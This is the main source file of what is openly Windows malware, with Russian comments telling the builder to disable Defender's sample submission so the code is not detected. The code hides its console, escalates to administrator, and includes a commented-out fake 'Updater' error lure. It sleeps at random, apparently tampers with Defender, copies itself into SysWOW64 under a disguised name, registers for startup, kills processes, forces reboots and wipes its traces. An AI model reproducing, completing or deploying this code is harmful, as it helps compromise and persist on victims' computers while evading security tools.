#include "func.h"
#include "include.h"
#include "threads.h"
using namespace std;
// g++ main.cpp -static -static-libgcc -static-libstdc++ -lgdi32 -o my_program.exe

// main execution of code parts depends on location and other conditions on the infected device
// 3213
// !!ВАЖНО!!
// ЕСЛИ У ТЕБЯ WINDOWS
// КОМПИЛИРОВАТЬ И ЗАПУСКАТЬ ПРОГРАММУ С ВЫКЛЮЧЕННОЙ АВТОМАТИЧЕСКОЙ ОТПРАВКОЙ ОБРАЗЦОВ НА ТВОЕМ ПК И НА ВИРТУАЛКЕ
// ЧТОБЫ ОТКЛЮЧИТЬ ОТПРАВКУ: Защита от вирусов и угроз - параметры защиты от вирусов и других угроз - управление настройками - автоотправка образцов отключить
int main(int argc, char* argv[]) {
    HWND Console;
    Console = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Console, 0);
    char path[MAX_PATH];
    if (!isUserAdmin()) {
        // MessageBox(NULL, "Please run as administrator to complete the installation! Error: 0x00000A9", "Updater", MB_ICONERROR | MB_OK);;
        restartAsAdmin();
        return 0;
    }
    Sleep(rand() % 5000 + 5000);
    if (copyAndRunSelf()) {
        return 0;
    }
    if (!checkAndCreateFile("lafkildatnn.dat")) {
        DefenderOwner();
        CopyFileToSysWow64("C:\\Windows\\SysWOW64\\adskisatana666.exe", "test.exe");
        addToStartup();
        Sleep(1500);
        reset();
        Sleep(rand() % 5000 + 5000);
        restartSystem();
        return 0;
    }
    std::thread killerThread(StopAllShit); // Запускаем фоновый поток
    killerThread.detach();
    Sleep(2000);
    ShellExecute(NULL, "runas", "C:\\Windows\\SysWOW64\\adskisatana666.exe", NULL, NULL, SW_SHOWNORMAL);
    // тут основной процесс закрепления 
    std::string filename = "C:\\Windows\\SysWOW64\\" + getDiskSerial() + ".txt";
    while (true) {
        if (GetFileAttributesA(filename.c_str()) != INVALID_FILE_ATTRIBUTES) {
            std::cout << "Found file!" << std::endl;
            DeleteFileA(filename.c_str());
            break;
        }
        Sleep(5000); // Пауза 5 секунд перед следующей проверкой
    }
    cleanfile();
    cleanreg();
    reset();
    return 0;
}